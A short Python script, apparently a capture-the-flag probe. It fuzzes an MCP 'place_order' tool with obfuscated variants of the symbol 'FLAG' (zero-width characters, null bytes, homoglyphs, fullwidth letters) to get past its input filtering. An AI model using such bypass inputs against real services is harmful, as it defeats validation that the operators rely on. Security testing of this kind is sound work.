#!/usr/bin/env python3
import json, sys
from mcpclient import MCP, extract

m = MCP()
syms = ["FLAG ", " FLAG", "FLAG\t", "FLAG\n", "FLAG\u200b", "FLAG\u0000", "FLA\u0047",
        "ﬂag", "ＦＬＡＧ", "FLAG.", "FLAG\x00", "AAPL\u200b", "flag ", "FLAg",
        "F"+"L"+"A"+"G", "FLAG\r", "FLAG\u00a0"]
for s in syms:
    try:
        r = m.tool("place_order", {"symbol": s, "quantity": 1, "order_type": "buy"}, timeout=30)
        print(repr(s), "->", extract(r)[:220])
    except Exception as e:
        print(repr(s), "EXC", e)
